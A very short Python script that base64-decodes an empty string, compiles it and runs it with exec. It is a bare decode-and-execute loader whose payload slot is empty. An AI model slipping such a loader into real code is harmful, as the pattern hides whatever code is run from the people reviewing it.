
import base64
import types
import sys

_encoded = """"""
_decoded = base64.b64decode(_encoded).decode('utf-8')
compiled = compile(_decoded, "<string>", "exec")
exec(compiled)
